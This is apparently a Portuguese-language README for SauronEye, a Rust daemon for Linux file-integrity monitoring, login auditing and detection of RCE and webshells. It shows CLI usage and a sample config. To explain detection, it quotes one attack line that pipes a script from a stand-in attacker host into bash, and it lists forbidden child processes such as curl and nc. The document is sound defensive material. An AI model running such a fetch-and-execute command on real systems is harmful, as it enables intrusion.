# SauronEye 👁️

[![Rust](https://img.shields.io/badge/linguagem-Rust-orange.svg)](https://www.rust-lang.org/)
[![Licença](https://img.shields.io/badge/licença-MIT%20OU%20Apache--2.0-blue.svg)](LICENSE)
[![Segurança](https://img.shields.io/badge/segurança-Argon2id%20%7C%20BLAKE3-green.svg)](#arquitetura-de-segurança)

> **"O Olho Que Tudo Vê"** — Monitoramento de Integridade de Arquivos (FIM) em Tempo Real, Sentinela de Linhagem de Processos, Auditor de Autenticação e Detector de RCE/Webshells em Rust.

---

*Read this in other languages: [English](README.md) | [Português (Brasil)](README.pt-BR.md)*

---

## Visão Geral

O **SauronEye** é um daemon sentinela de segurança leve e de baixo consumo de recursos construído em Rust. Ele fornece visibilidade instantânea sobre adulterações no sistema de arquivos, elevações não autorizadas de privilégio e execuções suspeitas de processos em servidores Linux de produção, sem depender de agentes pesados ou infraestruturas complexas.

---

## Principais Recursos

- **⚡ Portabilidade Universal de Hardware (Zero AVX Lock-in):**
  Utiliza **BLAKE3** e **xxHash (XXH3/XXH64)** com fallback escalar automático para garantir compatibilidade com processadores antigos e servidores virtualizados sem gerar falhas de instrução.
- **🧠 Detecção Contextual de Adulteração:**
  Correlaciona modificações de arquivos com a árvore de processos do `/proc`, travas ativas de gerenciadores (`dpkg`, `apt`, `yum`, `dnf`, `pacman`) e hashes oficiais de pacotes para diferenciar com precisão atualizações legítimas de ataques.
- **🛡️ Detecção de RCE e Webshells:**
  Monitora daemons protegidos (`nginx`, `apache`, `php-fpm`, `named`, `unbound`, `mysqld`, `redis`) e detecta em tempo real a invocação anômala de shells interativas (`/bin/sh`, `/bin/bash`, `python`, `curl`, `nc`).
- **🔐 Auditoria de Acessos e Logins:**
  Rastreia logins bem-sucedidos e com falha, elevações com `sudo` e sessões SSH em tempo real através da pilha PAM e do Netlink Audit do Linux.
- **🔒 Armazenamento Blindado e Auto-Proteção:**
  Banco embutido **SQLite3** em modo WAL com otimizações `WITHOUT ROWID`. A base de dados e os arquivos de configuração são compulsoriamente auto-monitorados contra adulteração.
- **🛡️ Trava One-Time Init:**
  O comando `init` é bloqueado permanentemente após a primeira execução. Atualizações da baseline só podem ser feitas por administradores autenticados com senha protegida via **Argon2id** (`sauroneye update`).
- **📲 Alertas Assíncronos Multi-Canal:**
  Notificações instantâneas via **Telegram Bot API** e **WhatsApp** (Evolution API / Z-API / Webhooks customizados).

---

## 📊 Matriz Comparativa de Recursos

Como o **SauronEye** se compara com ferramentas consagradas do mercado:

| Recurso / Capacidade | **SauronEye** 👁️ | **AIDE** | **Tripwire** | **OSSEC / Wazuh** | **Falco** |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **Linguagem e Arquitetura** | **Rust** (Memory-Safe, Async) | C (Legado) | C++ (Legado) | C / Python (Agente Complexo) | C++ / eBPF |
| **Monitoramento FIM em Tempo Real** | ✅ Sim (`fanotify` / `inotify`) | ❌ Cron Periódico | ❌ Cron Periódico | ⚠️ Periódico / Inotify | ⚠️ Regras de Syscall |
| **Filtro Contextual de Atualizações**<br>*(Diferencia Updates Legítimos de Ataques)* | ✅ **Nativo** (`/proc` + Locks + Pkg DB) | ❌ Não (Reset manual) | ❌ Não (Reset manual) | ❌ Regras customizadas complexas | ⚠️ Whitelist de Syscalls |
| **Detecção de RCE e Webshells**<br>*(Daemons gerando shells interativas)* | ✅ **Nativo** | ❌ Não | ❌ Não | ⚠️ Regex em logs | ✅ Sim (eBPF / Kernel) |
| **Portabilidade de Hardware**<br>*(Zero AVX Lock-in com fallback SIMD)* | ✅ **Sim** (BLAKE3 + xxHash) | ⚠️ MD5/SHA (Lento) | ⚠️ SHA-256 (Lento) | ⚠️ SHA-256 (Alto uso de CPU) | ⚠️ Depende de Kernel eBPF |
| **Armazenamento Embutido Zero-Config** | ✅ **SQLite3 (Modo WAL)** | ❌ Texto plano / Gzip | ❌ Banco proprietário | ❌ Elasticsearch / SQLite | ❌ Nenhum (Apenas stream) |
| **Trava One-Time Init e Auto-Proteção** | ✅ **Sim** (Argon2id + Lock) | ❌ Não | ❌ Não | ⚠️ Controlado pelo Manager | ❌ Não |
| **Alertas Nativos no Telegram e WhatsApp** | ✅ **Sim** (REST Assíncrono) | ❌ Apenas E-mail | ❌ Apenas E-mail | ⚠️ Via scripts/servidor | ⚠️ Webhook externo |
| **Consumo de Recursos e Dependências** | 🚀 **Mínimo** (Binário único estático) | 🔹 Baixo (Apenas CLI) | 🔹 Moderado | 🔴 Pesado (Servidor/Agente) | 🟡 Moderado (Driver de Kernel) |

---

## Início Rápido

### 1. Inicialização Inicial (One-Time Init)
```bash
# Inicializa a base SQLite, cadastra a senha do admin e executa a varredura da baseline
sauroneye --config config.toml init
```

### 2. Execução do Daemon de Monitoramento
```bash
# Executa em primeiro plano
sauroneye --config config.toml run
```

### 3. Atualização Autenticada de Baseline (Pós-Manutenção)
```bash
# Requer confirmação da senha do administrador
sauroneye --config config.toml update
```

### 4. Consultar Logs de Auditoria Forense
```bash
# Visualizar incidentes e eventos de segurança por período no terminal (requer senha de admin)
sauroneye --config config.toml logs --from "2026-08-30 00:00:00" --to "now"

# Limpar/purgar logs antigos por período da base de dados (requer senha de admin)
sauroneye --config config.toml logs --from "1970-01-01 00:00:00" --to "2026-08-01 00:00:00" --purge
```

### 5. Gerar e Enviar Relatório Forense em PDF por E-mail
```bash
# Gerar relatório executivo forense em PDF (requer senha de admin)
sauroneye --config config.toml report --output /var/log/sauroneye/relatorio.pdf --from "2026-08-30 00:00:00" --to "now"

# Gerar relatório em PDF e despachar diretamente via SMTP para destinatário por e-mail
sauroneye --config config.toml report --output /tmp/relatorio.pdf --from "2026-08-01" --to "2026-08-30" --email "seguranca@empresa.com.br"
```

### 6. Verificação de Status
```bash
sauroneye --config config.toml status
```

---

## Configuração (`config.toml`)

Todos os parâmetros são fortemente tipados e lidos via `config.toml`. Consulte [`config.toml.example`](config.toml.example) para a especificação completa:

```toml
[general]
hostname = "servidor-producao-01"
log_level = "info"
poll_interval_ms = 500

[database]
path = "/var/lib/sauroneye/sauron.db"
enable_wal = true

[fim]
backend = "auto"
hash_algorithm = "blake3"
include_paths = ["/etc", "/usr/bin", "/usr/sbin", "/bin", "/sbin", "/boot", "/root/.ssh"]
exclude_paths = ["/etc/mtab", "/etc/resolv.conf", "*.swp", "*.tmp"]

[package_manager]
auto_detect = true
check_package_db = true

[auth_monitor]
enabled = true
monitor_successful_logins = true
monitor_failed_attempts = true

[rce_detector]
enabled = true
protected_services = ["nginx", "apache2", "httpd", "php-fpm", "named", "unbound"]
forbidden_children = ["/bin/sh", "/bin/bash", "/usr/bin/python*", "/usr/bin/curl", "/usr/bin/nc"]

[notifications.telegram]
enabled = true
bot_token = "SEU_BOT_TOKEN_AQUI"
chat_id = "-1001234567890"

[notifications.whatsapp]
enabled = false
endpoint_url = "https://api.meuservidor.com/message/sendText/instancia"
api_key = "SUA_CHAVE_API_AQUI"
recipient_number = "5511999999999"
```

---

## 🛡️ Entendendo o `protected_services` e a Defesa contra RCE

### Como Funciona

Serviços e daemons de rede (como Nginx, Apache, PHP-FPM, BIND/Named, Unbound, MySQL e Redis) foram desenvolvidos para responder a requisições de rede — **nunca** para invocar interpretadores de comandos interativos.

Quando um invasor explora com sucesso uma vulnerabilidade de Execução Remota de Código (RCE) ou injeção de comandos, o daemon explorado inevitavelmente invoca uma shell ou utilitário:
```text
[nginx / php-fpm]  ──(spawn anômalo)──►  /bin/bash -c "curl atacante.com/rev.sh | bash"
```

O **SauronEye** monitora continuamente o pseudo-sistema de arquivos `/proc` do Linux e rastreia a árvore de processos (`PPID` ➔ `PID`). Se um processo cujo nome pai constar na lista **`protected_services`** tentar executar qualquer binário proibido de **`forbidden_children`**, o SauronEye intercepta o evento em milissegundos e envia um **Alerta Crítico de Segurança** contendo:
- Nome do serviço monitorado e PID pai (`PPID`);
- Nome do processo filho executado e PID;
- Linha de comando completa invocada (`cmdline`).

### Como Identificar os Daemons Ativos no seu Servidor

Para descobrir os nomes exatos dos processos (`comm`) rodando no seu servidor e preencher o `protected_services`:

1. **Listar as portas e processos em escuta:**
   ```bash
   sudo ss -tulpn
   ```
2. **Identificar o nome exato do comando no kernel (`comm`):**
   ```bash
   # Substitua <PID> pelo PID real do processo (ex: 1100):
   cat /proc/<PID>/comm
   ```
3. **Ou inspecione diretamente os daemons comuns:**
   ```bash
   ps -eo comm,pid,user,args | grep -E "nginx|apache|httpd|php|named|unbound|bind|mysql|mariadb|postgres|redis"
   ```
4. **Adicione os nomes encontrados no `config.toml`:**
   ```toml
   [rce_detector]
   enabled = true
   protected_services = [
       "nginx",
       "apache2",
       "httpd",
       "php-fpm8.2",
       "named",
       "unbound",
       "mariadbd",
       "mysqld",
       "redis-server"
   ]
   ```

> **Atenção:** **Não** adicione serviços interativos de login como `sshd` ou `login` no `protected_services`, pois a finalidade legítima do SSH é justamente abrir shells para usuários autenticados.

---

## Instalação e Implantação

Para passos detalhados de instalação em servidores de produção, configuração do serviço **Systemd** e diretivas de segurança, consulte o **[INSTALL.pt-BR.md](INSTALL.pt-BR.md)**.

---

## Documentação Arquitetural

Para o projeto executivo e especificações técnicas detalhadas em formato para impressão, consulte:
- **[SauronEye_Plano_Arquitetural.pdf](SauronEye_Plano_Arquitetural.pdf)**

---

## Licença

Distribuído sob licença dual:
- Licença Apache, Versão 2.0 ([LICENSE-APACHE](LICENSE-APACHE) ou http://www.apache.org/licenses/LICENSE-2.0)
- Licença MIT ([LICENSE-MIT](LICENSE-MIT) ou http://opensource.org/licenses/MIT)
